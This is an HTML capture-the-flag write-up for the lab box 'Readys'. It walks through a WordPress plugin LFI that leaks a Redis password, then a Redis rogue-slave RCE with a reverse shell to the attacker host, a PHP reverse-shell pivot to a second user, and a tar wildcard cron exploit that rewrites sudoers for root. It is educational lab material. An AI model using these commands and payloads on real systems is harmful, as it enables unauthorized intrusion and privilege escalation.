@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Readys &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Readys</h1>
+    <div class="meta">Target: <code>192.168.183.166</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">WordPress</span><span class="tag">LFI</span><span class="tag">Redis</span><span class="tag">RogueSlave</span><span class="tag">WPScan</span><span class="tag">TarWildcard</span><span class="tag">CronAbuse</span><span class="tag">PrivEsc</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#wordpress-plugin-enumeration">WordPress Plugin Enumeration</a><a class="lvl3" href="#leaking-the-redis-password-via-lfi">Leaking the Redis Password via LFI</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#redis-rogue-slave-rce">Redis Rogue Slave RCE</a><a class="lvl3" href="#credential-hunting-and-pivoting-to-alice">Credential Hunting and Pivoting to alice</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#tar-wildcard-injection-via-root-cron-job">Tar Wildcard Injection via Root Cron Job</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Readys is a multi-stage Linux box that chains a WordPress plugin LFI into a Redis credential leak, a Redis rogue-slave RCE to get a <code>redis</code> shell, and then a creative pivot through the LFI again to get a shell as <code>alice</code> who runs Apache. The root path is a classic tar wildcard injection in a cron job. Four distinct exploitation techniques across a single chain.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
+80/tcp   open  http    Apache httpd 2.4.38
+|_http-generator: WordPress 5.7.2
+6379/tcp open  redis   Redis key-value store
+</code></pre>
+<p>Redis on port 6379 requires authentication:</p>
+<pre><code class="language-sh">nc -vn 192.168.183.166 6379
+info
+-NOAUTH Authentication required.
+</code></pre>
+<h3 id="wordpress-plugin-enumeration">WordPress Plugin Enumeration</h3>
+<p>WPScan reveals the <code>/wp-content/uploads</code> directory listing is enabled, and a <strong>Site Editor</strong> plugin is installed at version 1.1.1.</p>
+<p><strong>WordPress Plugin Site Editor 1.1.1 - Local File Inclusion</strong>
+https://www.exploit-db.com/exploits/44340</p>
+<p>PoC:</p>
+<pre><code>http://&lt;host&gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+</code></pre>
+<blockquote>
+<p><strong>Why LFI is so valuable before foothold:</strong> LFI doesn't give code execution on its own, but it lets you read config files, credential stores, and service configurations that are otherwise inaccessible. Here it becomes the key to authenticating Redis, which is the actual path to a shell.</p>
+</blockquote>
+<p>Confirmed working, <code>/etc/passwd</code> output showed a real user <code>alice</code> (uid=1000).</p>
+<h3 id="leaking-the-redis-password-via-lfi">Leaking the Redis Password via LFI</h3>
+<p>Redis stores its configuration including password at <code>/etc/redis/redis.conf</code>. Reading it via LFI:</p>
+<pre><code>http://192.168.183.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf
+</code></pre>
+<p>Under the SECURITY section:</p>
+<pre><code># requirepass Ready4Redis?
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="redis-rogue-slave-rce">Redis Rogue Slave RCE</h3>
+<p>With the Redis password in hand, the rogue-slave technique uses a malicious Redis instance to push a malicious <code>.so</code> module to the target, which is then loaded and executed:</p>
+<ul>
+<li>Exploit script: https://github.com/Ridter/redis-rce/blob/master/redis-rce.py</li>
+<li>Malicious module: <code>exp.so</code> from https://github.com/n0b0dyCN/redis-rogue-server</li>
+</ul>
+<pre><code class="language-sh">python3 redis-rce.py -r 192.168.180.166 -p 6379 -L 192.168.45.244 -P 80 -v -f exp.so -a &quot;Ready4Redis?&quot;
+</code></pre>
+<p>The script establishes a master-slave replication relationship, pushes <code>exp.so</code> to the target, loads it as a Redis module, and triggers a reverse shell.</p>
+<p>Shell received as <code>redis</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 80
+connect to [192.168.45.244] from (UNKNOWN) [192.168.183.166] 41190
+whoami
+redis
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-python">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+redis@readys:/var/lib/redis$
+</code></pre>
+<h3 id="credential-hunting-and-pivoting-to-alice">Credential Hunting and Pivoting to alice</h3>
+<p><code>wp-config.php</code> contains the WordPress database credentials:</p>
+<pre><code class="language-sh">cat /var/www/html/wp-config.php
+define( 'DB_USER', 'karl' );
+define( 'DB_PASSWORD', 'Wordpress1234' );
+</code></pre>
+<p>MySQL was locally accessible and connected with these credentials, but the WordPress admin hash didn't crack.</p>
+<p><code>ps aux</code> shows Apache running as <code>alice</code>. The web root <code>/var/www/html</code> is not writable by <code>redis</code>, but finding writable directories:</p>
+<pre><code class="language-sh">find / -type d -maxdepth 5 -writable 2&gt;/dev/null
+</code></pre>
+<p><code>/run/redis</code> is writable. A PHP reverse shell was uploaded there, then triggered via the LFI vulnerability (which includes and executes PHP files):</p>
+<pre><code class="language-sh">curl &quot;http://192.168.183.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/run/redis/php-reverse-shell.php&quot;
+</code></pre>
+<p>Shell as <code>alice</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [192.168.45.244] from (UNKNOWN) [192.168.183.166] 33910
+uid=1000(alice) gid=1000(alice) groups=1000(alice)
+$ whoami
+alice
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="tar-wildcard-injection-via-root-cron-job">Tar Wildcard Injection via Root Cron Job</h3>
+<p><code>/etc/crontab</code> shows a root job running every 3 minutes:</p>
+<pre><code class="language-sh">*/3 * * * * root /usr/local/bin/backup.sh
+</code></pre>
+<p>Contents of <code>backup.sh</code>:</p>
+<pre><code class="language-sh">#!/bin/bash
+cd /var/www/html
+if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
+tar -cf /opt/backups/website.tar *
+fi
+</code></pre>
+<blockquote>
+<p><strong>Why tar wildcard injection works:</strong> When <code>tar</code> is called with a bare <code>*</code>, the shell expands the wildcard to all filenames in the current directory before passing them to <code>tar</code>. Filenames beginning with <code>--</code> are interpreted as flags by tar. Creating a file named <code>--checkpoint=1</code> tells tar to print a status after processing each file; creating <code>--checkpoint-action=exec=sh payload.sh</code> tells tar to run a shell command at each checkpoint. Since <code>tar</code> runs as root via cron, the payload runs as root.</p>
+</blockquote>
+<p>In <code>/var/www/html</code>, as <code>alice</code>:</p>
+<pre><code class="language-sh">echo &quot;&quot; &gt; '--checkpoint=1'
+echo &quot;&quot; &gt; '--checkpoint-action=exec=sh payload.sh'
+</code></pre>
+<p><code>payload.sh</code> contents (transferred from Kali):</p>
+<pre><code class="language-sh">echo 'apache ALL=(root) NOPASSWD: ALL' &gt; /etc/sudoers
+</code></pre>
+<p>After the cron fires (confirmed with <code>pspy32s</code>):</p>
+<pre><code class="language-sh">User alice may run the following commands on readys:
+    (root) NOPASSWD: ALL
+
+$ sudo su
+whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>LFI is a config file reader, not just a log poisoner.</strong> Reading <code>/etc/redis/redis.conf</code> via a WordPress plugin LFI broke open an entirely separate attack surface (Redis RCE).</li>
+<li><strong>Writable directories outside the web root can still serve PHP.</strong> Placing a PHP shell in <code>/run/redis</code> and triggering it through the same LFI endpoint combined two vulnerabilities into a lateral move.</li>
+<li><strong>Tar wildcard injection is reliable when you control the working directory.</strong> Files whose names start with <code>--</code> become tar command-line arguments. Any cron job that runs <code>tar *</code> in a user-writable directory is exploitable this way.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
